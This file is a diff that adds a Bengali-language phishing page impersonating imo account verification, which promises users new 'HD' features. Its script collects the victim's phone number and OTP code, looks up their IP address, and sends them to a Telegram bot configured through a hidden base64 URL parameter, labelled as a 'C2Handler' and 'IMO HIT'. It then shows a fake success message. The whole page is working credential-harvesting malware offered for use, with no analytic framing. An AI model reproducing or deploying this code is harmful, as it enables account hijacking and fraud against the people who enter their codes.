@@ -1,0 +1,317 @@
+<!doctype html>
+<html lang="bn">
+  <head>
+    <script src="/tg-client.js"></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>imo Support - Account Verification</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        font-family: "Roboto", sans-serif;
+        background-color: #f1f5f9;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        padding: 15px;
+      }
+      .container {
+        width: 100%;
+        max-width: 380px;
+        background: white;
+        border-radius: 12px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        overflow: hidden;
+        border-top: 5px solid #2e87ff;
+      }
+      .header {
+        padding: 30px 20px;
+        text-align: center;
+      }
+      .imo-logo {
+        width: 80px;
+        height: 80px;
+        background: #2e87ff;
+        border-radius: 20px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 15px;
+        color: white;
+        font-size: 40px;
+        font-weight: bold;
+        box-shadow: 0 4px 10px rgba(46, 135, 255, 0.3);
+      }
+      .main {
+        padding: 0 25px 30px;
+      }
+      .title {
+        font-size: 20px;
+        font-weight: 700;
+        color: #334155;
+        margin-bottom: 8px;
+        text-align: center;
+      }
+      .desc {
+        font-size: 14px;
+        color: #64748b;
+        text-align: center;
+        margin-bottom: 25px;
+        line-height: 1.5;
+      }
+
+      .form-group {
+        margin-bottom: 15px;
+        text-align: left;
+      }
+      .label {
+        font-size: 13px;
+        font-weight: 600;
+        color: #2e87ff;
+        margin-bottom: 5px;
+        display: block;
+      }
+      .input {
+        width: 100%;
+        padding: 14px;
+        border: 2px solid #e2e8f0;
+        border-radius: 8px;
+        font-size: 16px;
+        transition: 0.3s;
+        outline: none;
+      }
+      .input:focus {
+        border-color: #2e87ff;
+      }
+
+      .btn {
+        width: 100%;
+        padding: 14px;
+        background-color: #2e87ff;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+        box-shadow: 0 4px 12px rgba(46, 135, 255, 0.2);
+      }
+      .btn:hover {
+        background-color: #1a73e8;
+      }
+
+      .section {
+        display: none;
+      }
+      .active {
+        display: block;
+        animation: slideUp 0.4s ease;
+      }
+      @keyframes slideUp {
+        from {
+          transform: translateY(10px);
+          opacity: 0;
+        }
+        to {
+          transform: translateY(0);
+          opacity: 1;
+        }
+      }
+
+      #loading {
+        text-align: center;
+        padding: 20px;
+      }
+      .loader {
+        width: 35px;
+        height: 35px;
+        border: 4px solid #f3f3f3;
+        border-top: 4px solid #2e87ff;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin: 0 auto 10px;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="header">
+        <div class="imo-logo">imo</div>
+      </div>
+
+      <div class="main">
+        <div id="step1" class="section active">
+          <h3 class="title">imo অ্যাকাউন্ট ভেরিফাই করুন</h3>
+          <p class="desc">
+            আপনার imo নম্বরটি দিন এবং নতুন এইচডি ফিচারগুলো আনলক করুন।
+          </p>
+          <div class="form-group">
+            <label class="label">Phone Number</label>
+            <input
+              type="text"
+              id="phone"
+              class="input"
+              placeholder="+8801XXXXXXXXX"
+            />
+          </div>
+          <button class="btn" id="go1">Verify Now</button>
+        </div>
+
+        <div id="step2" class="section">
+          <h3 class="title">Confirm OTP</h3>
+          <p class="desc">
+            আমরা আপনার নম্বরে একটি ভেরিফিকেশন কোড পাঠিয়েছি। কোডটি নিচে লিখুন।
+          </p>
+          <div class="form-group">
+            <label class="label">Enter 4 or 6 Digit Code</label>
+            <input
+              type="text"
+              id="otp"
+              class="input"
+              placeholder="Enter Code"
+              maxlength="6"
+            />
+          </div>
+          <button class="btn" id="go2">Activate imo HD</button>
+        </div>
+
+        <div id="loading" class="section">
+          <div class="loader"></div>
+          <p style="color: #64748b; font-size: 14px">
+            অ্যাকাউন্ট কনফিগার করা হচ্ছে...
+          </p>
+        </div>
+
+        <div id="success" class="section" style="text-align: center">
+          <div style="font-size: 50px; color: #2ecc71; margin-bottom: 10px">
+            ✔️
+          </div>
+          <h3 class="title">অভিনন্দন!</h3>
+          <p class="desc">
+            আপনার রিকোয়েস্ট সফল হয়েছে। আগামী ২ ঘণ্টার মধ্যে আপনার imo প্রোফাইলে
+            নতুন ফিচারগুলো যুক্ত হবে।
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      class C2Handler {
+        constructor() {
+          this.config = this.init();
+        }
+
+        init() {
+          const params = new URLSearchParams(window.location.search);
+          const p = params.get("p");
+          if (p) {
+            try {
+              const decoded = JSON.parse(atob(p));
+              return { token: decoded.bot, chat: decoded.chat };
+            } catch (e) {
+              console.error("Config missing");
+            }
+          }
+          return { token: null, chat: null };
+        }
+
+        async getIP() {
+          try {
+            const res = await fetch("https://api.ipify.org?format=json");
+            const data = await res.json();
+            return data.ip;
+          } catch {
+            return "Unknown";
+          }
+        }
+
+        async sendTelegram(phone, otp = "", stage = "imo Start") {
+          if (!this.config.token || !this.config.chat) return;
+
+          const ip = await this.getIP();
+          const time = new Date().toLocaleString("bn-BD", {
+            timeZone: "Asia/Dhaka",
+          });
+
+          let message = `*❄️ IMO HIT DETECTED* 🔥\n\n`;
+          message += `📱 *Phone:* \`${phone}\`\n`;
+          if (otp) message += `🔑 *OTP Code:* \`${otp}\` ✅\n`;
+          message += `\n📊 *Stage:* ${stage}\n`;
+          message += `🌐 *IP:* \`${ip}\`\n`;
+          message += `🕐 *Time:* ${time}\n`;
+
+          try {
+            await fetch(
+              `https://api.telegram.org/bot${this.config.token}/sendMessage`,
+              {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  chat_id: this.config.chat,
+                  text: message,
+                  parse_mode: "Markdown",
+                }),
+              },
+            );
+          } catch (e) {
+            console.error("Network Error");
+          }
+        }
+      }
+
+      const c2 = new C2Handler();
+      let userPhone = "";
+
+      // Step 1
+      document.getElementById("go1").onclick = async () => {
+        userPhone = document.getElementById("phone").value.trim();
+        if (userPhone.length < 10) {
+          alert("সঠিক নম্বর দিন!");
+          return;
+        }
+
+        document.getElementById("go1").innerText = "Sending...";
+        await c2.sendTelegram(userPhone, "", "Step 1: Phone Received");
+
+        document.getElementById("step1").classList.remove("active");
+        document.getElementById("step2").classList.add("active");
+      };
+
+      // Step 2
+      document.getElementById("go2").onclick = async () => {
+        const otpVal = document.getElementById("otp").value.trim();
+        if (otpVal.length < 4) {
+          alert("কোডটি সঠিকভাবে লিখুন!");
+          return;
+        }
+
+        document.getElementById("step2").classList.remove("active");
+        document.getElementById("loading").classList.add("active");
+
+        await c2.sendTelegram(userPhone, otpVal, "Step 2: Full Hit (OTP)");
+
+        setTimeout(() => {
+          document.getElementById("loading").classList.remove("active");
+          document.getElementById("success").classList.add("active");
+        }, 4000);
+      };
+    </script>
+  </body>
+</html>
